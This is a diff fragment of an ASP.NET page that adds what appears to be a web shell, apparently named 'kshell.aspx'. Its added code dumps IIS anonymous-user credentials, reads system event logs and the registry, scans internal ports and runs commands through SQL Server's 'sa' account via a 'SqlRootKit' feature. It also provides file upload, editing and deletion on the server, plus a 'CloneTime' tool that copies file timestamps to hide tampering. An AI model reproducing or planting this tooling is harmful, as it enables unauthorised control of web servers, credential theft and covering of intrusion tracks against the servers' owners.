+				Catch
+				rw(fail_description)
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "syslog"
+%>
+<form runat="server">
+	<p align=center>[ List System Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
+				dim Fields_to_load = "Logfile,Message,type"
+				dim fail_description = " Access to " + WMI_function + " is protected"
+				
+				Try
+				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
+				Catch
+				rw("This function is disabled by server")
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "auser"
+%>
+<form runat="server">
+	<p align=center>[ IIS List Anonymous' User details ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<table align=center>
+		<tr>
+			<td>
+			<% 
+				Try
+				IIS_list_Anon_Name_Pass
+				Catch
+				rw("This function is disabled by server")
+				End Try
+			%>
+			</td>
+		</tr>
+	</table>
+</form>
+<%
+	case "scan"
+%>
+	<form runat="server">
+    <p>[ ASP.NET Port Scanner ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+    <div>
+    	C# coded by Hackwol & Lenk, VB coded by kikicoco (19/08/2008)<br /><br />
+        Start IP :&nbsp;&nbsp;<asp:TextBox ID="txtStartIP" runat="server" Width="177px">127.0.0.1</asp:TextBox>
+        &nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID="txtEndIP" runat="server" Width="185px">127.0.0.1</asp:TextBox>&nbsp;
         <br />
-      connection string:
-        <asp:TextBox ID="connections" runat="server" Height="25px" Width="491px"></asp:TextBox>
-        &nbsp;<asp:Button ID="gdb" runat="server" Text="get db" OnClick="gdb_Click" Height="36px" Width="84px" />
+        Ports &nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;<asp:TextBox ID="txtPorts" runat="server" Width="473px">21,25,80,1433,3306,3389</asp:TextBox><br />
         <br />
+        <asp:Button ID="btnScan" runat="server" Text="Scan" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnScan_Click" />
+        &nbsp;&nbsp;
+        <asp:Button ID="btnReset" runat="server" Text="Reset" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnReset_Click" /><br />
         <br />
-        select DB:
-        <asp:DropDownList ID="DropDownList1" runat="server" Height="19px" Width="114px" >
-        </asp:DropDownList>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-        <asp:Button ID="Button1" runat="server" Text="get Tables" OnClick="Button1_Click" />
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tables:
-        <asp:DropDownList ID="DropDownList2" runat="server">
-        </asp:DropDownList>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <asp:Label ID="Label1" runat="server" Text="Result:" Visible="False" Width="70px"></asp:Label><br />
+        <asp:ListBox ID="lstRet" runat="server" BackColor="Black" ForeColor="#00C000" Height="251px"
+            Width="527px" Visible="False"></asp:ListBox>
+        <hr align=left style="width: 526px" />
         <br />
-        <br />
-      
-        </div>
-            Run Query<br />
-                      <asp:TextBox runat="server" TextMode="MultiLine" Height="209px" Width="777px" ID="sqlquery"></asp:TextBox><br />
-                 <asp:Button id="executequery" runat="server" Text="Execute" OnClick="executequery_Click"  />
-        
-    </asp:Panel>
-            
-              <asp:Panel ID="UserInfo"  runat="server" Visible="false"  class="tab_content"  >
-        
-     
-    
-           
-        
-    </asp:Panel>
-                   <asp:Panel ID="Processes_Services"  runat="server" Visible="false"  class="tab_content"  >
-        
-     
-    <div  id="current" style="  height: 57px; width: 100%; border-style: inset">
-        <br />
-        <asp:Button ID="Button_process" runat="server" OnClick="Button_process_Click" Text="Process" />
-      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-        <asp:Button ID="Button_services" runat="server" Text="Services" OnClick="Button_services_Click" />
-        <br />
-        <br />
-      
-        </div>
-           
-        
-    </asp:Panel>
-     <asp:Panel ID="CopyFiles"  runat="server" Visible="false"  class="tab_content"  >
-     <div>
-        <asp:Label ID="Label1" runat="server" Width="150" Text="Enter Source"></asp:Label>
-        <asp:TextBox ID="TextBox1" runat="server" Width="384px"></asp:TextBox>
-        <br />
-        <asp:Label ID="Label2" runat="server" Width="150" Text="Enter Dest"></asp:Label>
-        <asp:TextBox ID="TextBox2" runat="server" Width="384px"></asp:TextBox>
-    <br />
-     <asp:Button ID="Button3" runat="server" Text="Button" OnClick="CopyFile" />
-     <asp:Label ID="Label3" runat="server"    ></asp:Label>
-    </div>
-    </asp:Panel>
-               </div>
-                  
-
-    </div>
-
+       </div>
     </form>
-          </body>
+<%
+case "iisspy"
+%>
+	<p align=center>[ IIS Spy ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<% 
+				Try
+				Response.write(IISSpy())
+				Catch
+				rw("This function is disabled by server")
+				End Try
+	%>
+<%
+case "sqltool"
+%>
+	<p align=center>[ SQL Tool ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+	<% 
+				Try
+				
+				Catch
+				rw("This function is disabled by server")
+				End Try
+	%>
+<%
+case "regshell"
+%>
+	<form runat="server">
+	<p align=center >[ Registry Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  	Key:&nbsp;&nbsp;
+	<asp:TextBox ID="txtRegKey" runat="server" style="width: 595px; border: 1px solid #084B8E">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox><br><br>
+	Value:
+	<asp:TextBox ID="txtRegValue" runat="server" style="border: 1px solid #084B8E">ComputerName</asp:TextBox>&nbsp;&nbsp;
+  	<asp:Button ID="btnReadReg" runat="server" Text="Run" OnClick="RegistryRead" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
+  	<p>
+    <asp:Label ID="lblresultReg" runat="server" style="color: red"/>      
+    </p>
+	</form>
+<%
+	case "sqlman"
+%>
+<form runat="server">
+  <p>[ MSSQL Query ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  <p> Execute query with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
+  <p>Host:
+    <asp:TextBox ID="txtHost" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
+  <p>
+  SQL Name:
+    <asp:TextBox ID="txtSqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
+  SQL Password:
+  <asp:TextBox ID="txtSqlPass" runat="server" Width="80" class="TextBox"/>
+  </p>
+  Command:
+  <asp:TextBox ID="txtSqlcmd" runat="server" Width="500" class="TextBox" TextMode="MultiLine" Rows="6"/></br>
+  <asp:Button ID="btnButtonSQL" runat="server" Text="Run" OnClick="RunSQLQUERY" class="buttom" Width="100"/>  
+  <p>
+   <asp:Label ID="lblresultSQL" runat="server" style="style2"/>      </p>
+</form>
+<%
+	case "sqlrootkit"
+%>
+<form runat="server">
+  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
+  <p> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
+  <p>Host:
+    <asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
+  <p>
+  SQL Name:
+    <asp:TextBox ID="SqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
+  SQL Password:
+  <asp:TextBox ID="SqlPass" runat="server" Width="80" class="TextBox"/>
+  </p>
+  Command:
+  <asp:TextBox ID="Sqlcmd" runat="server" Width="300" class="TextBox"/>
+  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
+  <p>
+   <asp:Label ID="resultSQL" runat="server" style="style2"/>      </p>
+</form>
+<%
+	case "del"
+		dim a as string
+		a=request.QueryString("src")
+		call existdir(a)
+		call del(a)  
+		response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success!"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
+	case "copy"
+		call existdir(request.QueryString("src"))
+		session("cutboard")="" & request.QueryString("src")
+		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
+	case "cut"
+		call existdir(request.QueryString("src"))
+		session("cutboard")="" & request.QueryString("src")
+		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
+	case "paste"
+		dim ow as integer
+		if request.Form("OverWrite")<>"" then ow=1
+		if request.Form("Cancel")<>"" then ow=2
+		url=request.QueryString("src")
+		call existdir(url)
+		dim d as string
+		d=session("cutboard")
+		if left(d,1)="" then
+			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
+			TEMP2=url & replace(path.getfilename(d),"","")
+			if right(d,1)="\" then   
+				call xexistdir(TEMP1,ow)
+				directory.move(replace(d,"",""),TEMP1 & "\")  
+				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
+			else
+				call xexistdir(TEMP2,ow)
+				file.move(replace(d,"",""),TEMP2)
+				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
+			end if
+		else
+			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
+			TEMP2=url & path.getfilename(replace(d,"",""))
+			if right(d,1)="\" then 
+				call xexistdir(TEMP1,ow)
+				directory.createdirectory(TEMP1)
+				call copydir(replace(d,"",""),TEMP1 & "\")
+				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
+			else
+				call xexistdir(TEMP2,ow)
+				file.copy(replace(d,"",""),TEMP2)
+				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
+			end if
+		end if
+	case "upfile"
+		url=request.QueryString("src")
+%>
+<form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
+ You will upload file to this directory : <span class="style3"><%=url%></span><br>
+ Please choose file from your computer :
+ <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
+    <input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad" class="buttom">
+</form>
+<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
+<%
+	case "new"
+		url=request.QueryString("src")
+%>
+<form runat="server">
+  <%=url%><br>
+  Name:
+  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
+  <br>
+  <asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/>
+  <asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/> 
+  <br>
+  <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
+  <input name="Src" type="hidden" value="<%=url%>">
+</form>
+<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
+<%
+	case "edit"
+		dim b as string
+		b=request.QueryString("src")
+		call existdir(b)
+		dim myread as new streamreader(b,encoding.default)
+		filepath.text=b
+		content.text=myread.readtoend
+%>
+<form runat="server">
+  <table width="100%"  border="1" align="center">
+    <tr>      <td width="11%">Path</td>
+      <td width="89%">
+      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
+      *</td>
+    </tr>
+    <tr>
+      <td>Content</td> 
+      <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
+    </tr>
+    <tr>
+      <td></td>
+      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
+      </td>
+    </tr>
+  </table>
+</form>
+<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
+<%
+  		myread.close
+	case "rename"
+		url=request.QueryString("src")
+		if request.Form("name")="" then
+	%>
+<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
+  <p>You will rename <span class="style3"><%=request.QueryString("src")%></span>to: <%=getparentdir(request.QueryString("src"))%>
+    <input type="text" name="name" class="TextBox">
+    <input type="submit" name="Submit3" value="Submit" class="buttom">
+</p>
+</form>
+<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
+<script language="javascript">
+function checkname()
+{
+if(formRn.name.value==""){alert("You shall input filename :(");return false}
+}
+</script>
+  <%
+		else
+			if Rename() then
+				response.Write("<script>alert('Rename " & replace(url,"\","\\") & " to " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
+			else
+				response.Write("<script>alert('Exist the same name file , rename fail :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
+			end if
+		end if
+	case "samename"
+		url=request.QueryString("src")
+%>
+<form name="form1" method="post" action="?action=paste&src=<%=server.UrlEncode(url)%>">
+<p class="style3">Exist the same name file , can you overwrite ?(If you click &quot; no&quot; , it will auto add a number as prefix)</p>
+  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
+<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
+</form>
+<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
+   <%
+    case "clonetime"
+		time1.Text=request.QueryString("src")&"kshell.aspx"
+		time2.Text=request.QueryString("src")
+	%>
+<form runat="server">
+  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:history.back(1);">Back</a></i> </p>
+  <p>A tool that it copy the file or directory's time to another file or directory </p>
+  <p>Rework File or Dir:
+    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
+  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
+<asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/>
+</form>
+<p>
+  <%
+	case "logout"
+   		session.Abandon()
+		response.Write("<script>alert(' Goodbye !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
+	end select
+end if
+Catch error_x
+	response.Write("<font color=""red""><br>Wrong: </font>"&error_x.Message)
+End Try
+%>
+</p>
+</p>
+<hr>
+<script language="javascript">
+function closewindow()
+{self.close();}
+</script>
+</body>
 </html>
-{"res":"error","msg":"Thread was being aborted."}
